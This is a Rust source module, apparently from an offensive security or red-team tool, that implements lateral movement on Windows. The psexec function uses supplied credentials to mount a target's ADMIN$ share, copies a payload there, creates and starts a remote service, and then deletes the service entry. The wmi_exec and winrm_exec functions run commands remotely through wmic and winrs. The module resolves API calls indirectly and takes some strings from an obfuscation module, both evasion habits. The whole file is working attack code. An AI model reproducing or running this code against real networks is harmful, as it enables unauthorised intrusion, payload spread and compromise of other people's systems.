use crate::log::LogSink;

pub struct LateralResult {
    pub module: String,
    pub description: String,
}

#[cfg(windows)]
pub fn psexec(
    target: &str, service_name: &str, payload_path: &str,
    username: &str, password: &str, log: &LogSink,
) -> Result<LateralResult, String> {
    log.step("  Remote Service:");

    // Connect to target's admin share
    log.detail(format!("    Connecting to \\\\{}\\ADMIN$", target));
    let remote_share = format!("\\\\{}\\ADMIN$\0", target);
    let user_c = format!("{}\0", username);
    let pass_c = format!("{}\0", password);

    unsafe {
        // NETRESOURCEA: dwType=0, lpRemoteName=share
        #[repr(C)]
        struct NetResource {
            scope: u32,
            r#type: u32,
            display_type: u32,
            usage: u32,
            local_name: *const u8,
            remote_name: *const u8,
            comment: *const u8,
            provider: *const u8,
        }
        let nr = NetResource {
            scope: 0, r#type: 0, display_type: 0, usage: 0,
            local_name: std::ptr::null(),
            remote_name: remote_share.as_ptr(),
            comment: std::ptr::null(),
            provider: std::ptr::null(),
        };

        let result = crate::resolve::WNetAddConnection2A(
            &nr as *const _ as *const std::ffi::c_void,
            pass_c.as_ptr(), user_c.as_ptr(), 0,
        );
        if result != 0 {
            return Err(format!("Failed to connect to \\\\{}\\ADMIN$ (error {})", target, result));
        }
        log.detail("    Connected to admin share");

        // Copy payload to remote
        let dest_path = format!("\\\\{}\\ADMIN$\\{}.exe\0", target, service_name);
        let src_c = std::ffi::CString::new(payload_path).map_err(|_| "Invalid path")?;
        if crate::resolve::CopyFileA(
            src_c.as_ptr() as *const u8, dest_path.as_ptr(), 0,
        ) == 0 {
            crate::resolve::WNetCancelConnection2A(remote_share.as_ptr(), 0, 1);
            return Err("Failed to copy payload to remote".into());
        }
        log.detail(format!("    Copied to {}", dest_path.trim_end_matches('\0')));

        // Open SC Manager on remote
        let target_c = format!("{}\0", target);
        let sc_manager = crate::resolve::OpenSCManagerA(
            target_c.as_ptr(), std::ptr::null(), 0xF003F, // SC_MANAGER_ALL_ACCESS
        );
        if sc_manager.is_null() {
            crate::resolve::WNetCancelConnection2A(remote_share.as_ptr(), 0, 1);
            return Err("Failed to open service manager on remote".into());
        }

        // Create service
        let svc_name_c = format!("{}\0", service_name);
        let bin_path = format!("%SystemRoot%\\{}.exe\0", service_name);
        let service = crate::resolve::CreateServiceA(
            sc_manager,
            svc_name_c.as_ptr(), svc_name_c.as_ptr(),
            0xF01FF, // SERVICE_ALL_ACCESS
            0x10,    // SERVICE_WIN32_OWN_PROCESS
            0x03,    // SERVICE_DEMAND_START
            0x01,    // SERVICE_ERROR_NORMAL
            bin_path.as_ptr(),
            std::ptr::null(), std::ptr::null_mut(),
            std::ptr::null(), std::ptr::null(), std::ptr::null(),
        );
        if service.is_null() {
            crate::resolve::CloseServiceHandle(sc_manager);
            crate::resolve::WNetCancelConnection2A(remote_share.as_ptr(), 0, 1);
            return Err("Failed to create remote service".into());
        }
        log.detail(format!("    Service '{}' created", service_name));

        // Start and clean up
        let start_result = crate::resolve::StartServiceA(service, 0, std::ptr::null());
        if start_result == 0 {
            log.detail("    Warning: service start returned 0 (may still be running)");
        } else {
            log.detail("    Service started");
        }

        crate::resolve::DeleteService(service);
        log.detail("    Service entry removed");
        crate::resolve::CloseServiceHandle(service);
        crate::resolve::CloseServiceHandle(sc_manager);
        crate::resolve::WNetCancelConnection2A(remote_share.as_ptr(), 0, 1);
    }

    Ok(LateralResult {
        module: "Remote Service".into(),
        description: format!("Executed on {} via service '{}'", target, service_name),
    })
}

#[cfg(not(windows))]
pub fn psexec(
    _target: &str, _service_name: &str, _payload_path: &str,
    _username: &str, _password: &str, _log: &LogSink,
) -> Result<LateralResult, String> {
    Err("Remote service requires target platform".into())
}

#[cfg(windows)]
fn run_remote_command(tool: &str, args: &str, log: &LogSink) -> Result<String, String> {
    let full_cmd = format!("/c {} {}", tool, args);
    let cmd_wide: Vec<u16> = format!("{}\0", full_cmd).encode_utf16().collect();
    let cmd_exe = crate::obf::s(crate::obf::CMD_EXE);
    let cmd_exe_wide: Vec<u16> = format!("{}\0", cmd_exe).encode_utf16().collect();

    unsafe {
        // Create pipe for stdout capture
        let mut read_pipe: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut write_pipe: *mut std::ffi::c_void = std::ptr::null_mut();

        // SECURITY_ATTRIBUTES with bInheritHandle = TRUE
        #[repr(C)]
        struct SecurityAttributes {
            length: u32,
            descriptor: *const std::ffi::c_void,
            inherit: i32,
        }
        let sa = SecurityAttributes { length: 12, descriptor: std::ptr::null(), inherit: 1 };
        if crate::resolve::CreatePipe(
            &mut read_pipe, &mut write_pipe,
            &sa as *const _ as *const std::ffi::c_void, 0,
        ) == 0 {
            return Err("Failed to create output pipe".into());
        }

        // STARTUPINFOW: hStdOutput = write_pipe, hStdError = write_pipe, dwFlags = STARTF_USESTDHANDLES
        let mut si = [0u8; 104];
        *(si.as_mut_ptr() as *mut u32) = 104;
        *(si.as_mut_ptr().add(60) as *mut u32) = 0x100; // dwFlags = STARTF_USESTDHANDLES
        *(si.as_mut_ptr().add(88) as *mut *mut std::ffi::c_void) = write_pipe; // hStdOutput
        *(si.as_mut_ptr().add(96) as *mut *mut std::ffi::c_void) = write_pipe; // hStdError

        let mut pi = [0u8; 24];

        let result = crate::resolve::CreateProcessW(
            cmd_exe_wide.as_ptr(),
            cmd_wide.as_ptr() as *mut u16,
            std::ptr::null(), std::ptr::null(),
            1, 0x08000000, // inherit handles, CREATE_NO_WINDOW
            std::ptr::null(), std::ptr::null(),
            si.as_ptr() as *const std::ffi::c_void,
            pi.as_mut_ptr() as *mut std::ffi::c_void,
        );
        crate::resolve::CloseHandle(write_pipe);

        if result == 0 {
            crate::resolve::CloseHandle(read_pipe);
            return Err(format!("Failed to execute: {} {}", tool, args));
        }

        let proc_handle = *(pi.as_ptr() as *const *mut std::ffi::c_void);
        crate::resolve::WaitForSingleObject(proc_handle, 60000);

        // Read output
        let mut output = Vec::new();
        let mut buf = [0u8; 4096];
        loop {
            let mut read: u32 = 0;
            let ok = crate::resolve::ReadFile(
                read_pipe, buf.as_mut_ptr(),
                4096, &mut read, std::ptr::null_mut(),
            );
            if ok == 0 || read == 0 { break; }
            output.extend_from_slice(&buf[..read as usize]);
        }
        crate::resolve::CloseHandle(read_pipe);
        crate::resolve::CloseHandle(proc_handle);
        let thread_handle = *(pi.as_ptr().add(8) as *const *mut std::ffi::c_void);
        crate::resolve::CloseHandle(thread_handle);

        let text = String::from_utf8_lossy(&output).to_string();
        log.detail(format!("    Output: {}", text.trim()));
        Ok(text)
    }
}

#[cfg(windows)]
pub fn wmi_exec(
    target: &str, command: &str, username: &str, password: &str, log: &LogSink,
) -> Result<LateralResult, String> {
    log.step("  Remote Execution (WMI):");
    log.detail(format!("    Target: {}", target));

    let args = if username.is_empty() {
        format!("/node:{} process call create \"{}\"", target, command)
    } else {
        format!(
            "/node:{} /user:{} /password:{} process call create \"{}\"",
            target, username, password, command
        )
    };

    run_remote_command("wmic", &args, log)?;

    Ok(LateralResult {
        module: "Remote Execution (WMI)".into(),
        description: format!("Executed on {} via WMI", target),
    })
}

#[cfg(not(windows))]
pub fn wmi_exec(
    _target: &str, _command: &str, _username: &str, _password: &str, _log: &LogSink,
) -> Result<LateralResult, String> {
    Err("Remote execution (WMI) requires target platform".into())
}

#[cfg(windows)]
pub fn winrm_exec(
    target: &str, command: &str, username: &str, password: &str, log: &LogSink,
) -> Result<LateralResult, String> {
    log.step("  Remote Execution (WinRM):");
    log.detail(format!("    Target: {}", target));

    let args = if username.is_empty() {
        format!("-r:{} {}", target, command)
    } else {
        format!("-r:{} -u:{} -p:{} {}", target, username, password, command)
    };

    run_remote_command("winrs", &args, log)?;

    Ok(LateralResult {
        module: "Remote Execution (WinRM)".into(),
        description: format!("Executed on {} via WinRM", target),
    })
}

#[cfg(not(windows))]
pub fn winrm_exec(
    _target: &str, _command: &str, _username: &str, _password: &str, _log: &LogSink,
) -> Result<LateralResult, String> {
    Err("Remote execution (WinRM) requires target platform".into())
}
